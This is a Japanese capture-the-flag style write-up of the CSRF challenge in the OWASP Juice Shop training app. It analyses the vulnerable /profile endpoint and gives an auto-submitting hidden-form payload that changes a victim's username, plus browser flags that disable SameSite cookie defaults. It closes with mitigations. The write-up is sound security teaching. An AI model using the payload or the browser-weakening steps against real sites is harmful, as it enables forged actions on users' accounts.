# CSRF ✅ (ソースコード分析完了)

**難易度:** ⭐⭐⭐
**カテゴリ:** Broken Access Control
**目標:** 別オリジンからユーザー名を変更する

## ソースコード分析

### 脆弱なエンドポイント

**ファイル:** `routes/updateUserProfile.ts`

```typescript
// POST /profile エンドポイント
export function updateUserProfile () {
  return async (req: Request, res: Response, next: NextFunction) => {
    const loggedInUser = security.authenticatedUsers.get(req.cookies.token)

    // チャレンジ検証ロジック (lines 30-34)
    challengeUtils.solveIf(challenges.csrfChallenge, () => {
      return ((req.headers.origin?.includes('://htmledit.squarefree.com')) ??
        (req.headers.referer?.includes('://htmledit.squarefree.com'))) &&
        req.body.username !== user.username
    })

    // CSRFトークン検証なしでユーザー名を更新
    const savedUser = await user.update({ username: req.body.username })
  }
}
```

### 脆弱性の原因

1. **CSRFトークンなし**: POSTリクエストにCSRFトークン検証がない
2. **SameSite Cookie未設定**: `lib/insecurity.ts` line 195 で Cookie に SameSite 属性がない
3. **Origin/Referer検証なし**: チャレンジ検出のみ、リクエストはブロックされない

```typescript
// lib/insecurity.ts line 195
res.cookie('token', token)  // SameSite オプションなし
```

### ルート登録

**ファイル:** `server.ts` line 659
```typescript
app.post('/profile', updateUserProfile())
```

## 実行手順

### Step 1: 攻撃用HTMLを作成

```html
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
  <form action="http://localhost:3000/profile" method="POST">
    <input type="hidden" name="username" value="CSRF_ATTACKED">
  </form>
</body>
</html>
```

### Step 2: htmledit.squarefree.com で実行

1. http://htmledit.squarefree.com を開く
2. 上記HTMLを入力
3. 被害者が Juice Shop にログインした状態でアクセス

### Step 3: チャレンジ成功条件

```typescript
// チャレンジは以下の条件で解決:
// 1. Origin または Referer に "://htmledit.squarefree.com" が含まれる
// 2. req.body.username !== user.username (ユーザー名が実際に変更される)
```

## 環境依存の注意

### 現代ブラウザの制限

Chrome 80+, Firefox 96+ では `SameSite=Lax` がデフォルト:

```bash
# Chrome で SameSite を無効化して起動
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
  --disable-features=SameSiteByDefaultCookies

# Firefox で無効化
about:config → network.cookie.sameSite.laxByDefault = false
```

### 古いブラウザ

- Chrome 79 以前
- Firefox 96 以前

## 攻撃フロー

```
[攻撃者] → [htmledit.squarefree.com にHTML配置]
                    ↓
[被害者] → [Juice Shop にログイン] → [攻撃HTMLにアクセス]
                    ↓
[ブラウザ] → [自動的に POST /profile を送信 (Cookie付き)]
                    ↓
[サーバー] → [Origin をチェック → チャレンジ解決 → ユーザー名変更]
```

## 解説

### CSRF とは何か？

**日常的な例えで説明すると:**

銀行の窓口を想像してください。

- 正常: 本人が窓口に来て「10万円送金してください」と依頼
- CSRF: 詐欺師が本人の署名入り委任状を偽造して「10万円送金してください」

ブラウザの Cookie は「この委任状」のようなもの。自動的に付与されるため、悪意あるサイトが「本人のふりをして」リクエストを送れる。

### 攻撃の仕組み

```
┌─────────────────────────────────────────────────────┐
│ 1. 被害者が Juice Shop にログイン                    │
│    ブラウザに認証 Cookie が保存される                │
└─────────────────────────────────────────────────────┘
           │
           ▼
┌─────────────────────────────────────────────────────┐
│ 2. 被害者が攻撃者のサイトにアクセス                  │
│    (メールのリンク、広告など)                        │
└─────────────────────────────────────────────────────┘
           │
           ▼
┌─────────────────────────────────────────────────────┐
│ 3. 攻撃者のサイトが hidden form を自動送信           │
│                                                     │
│    <form action="http://juice-shop/profile" ...>   │
│      <input name="username" value="HACKED">         │
│    </form>                                          │
│    <script>document.forms[0].submit()</script>      │
└─────────────────────────────────────────────────────┘
           │
           ▼
┌─────────────────────────────────────────────────────┐
│ 4. ブラウザが Cookie を自動添付してリクエスト送信    │
│                                                     │
│    POST /profile                                    │
│    Cookie: token=xxx  ← 自動で付く!                 │
│    Body: username=HACKED                            │
└─────────────────────────────────────────────────────┘
           │
           ▼
┌─────────────────────────────────────────────────────┐
│ 5. サーバーは正規のリクエストと区別できない          │
│    「Cookie が正しいから本人だ」→ ユーザー名変更     │
└─────────────────────────────────────────────────────┘
```

### なぜ Cookie だけでは不十分か

| 確認できること | 確認できないこと |
|--------------|----------------|
| ✅ 「誰の」リクエストか (Cookie で認証) | ❌ 「本人の意図」で送られたか |

```
Cookie = 身分証明書
CSRF トークン = 「今日の合言葉」

身分証明書だけでは「本人が自分の意志で来たか」は分からない
→ 毎回変わる合言葉で「本人の意図」を確認する
```

### なぜ脆弱か

1. **CSRF トークンなし**: 「今日の合言葉」を確認していない
2. **SameSite Cookie なし**: 他サイトからのリクエストでも Cookie が送られる
3. **Origin 検証なし**: リクエスト元を確認していない

### 根本原因

**「Cookie が正しい = ユーザーの意図」という誤った仮定**

Cookie は「誰か」を証明するが、「その人がこの操作を望んでいるか」は証明しない。

### 対策

| 対策 | 説明 |
|------|------|
| **CSRF トークン** | フォームに毎回変わる秘密の値を埋め込む |
| **SameSite Cookie** | 他サイトからのリクエストで Cookie を送らない |
| **Origin 検証** | リクエスト元が正規サイトか確認 |

### 対策

```typescript
// 1. CSRFトークン検証を追加
import csrf from 'csurf'
app.use(csrf())

// 2. SameSite Cookie を設定
res.cookie('token', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'Strict'
})

// 3. Origin 検証を強制
if (!req.headers.origin?.includes(allowedOrigin)) {
  return res.status(403).send('Origin not allowed')
}
```

## 関連ファイル

| ファイル | 説明 |
|---------|------|
| `routes/updateUserProfile.ts` | 脆弱なエンドポイント |
| `lib/insecurity.ts:195` | Cookie設定 (SameSiteなし) |
| `server.ts:659` | ルート登録 |
| `test/cypress/e2e/profile.spec.ts` | テストケース |

## ステータス

- [x] ソースコード分析完了
- [x] 攻撃ベクトル特定
- [x] ペイロード作成
- [ ] 古いブラウザで検証 (環境依存)

## 参考リンク

- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [SameSite Cookies Explained](https://web.dev/samesite-cookies-explained/)
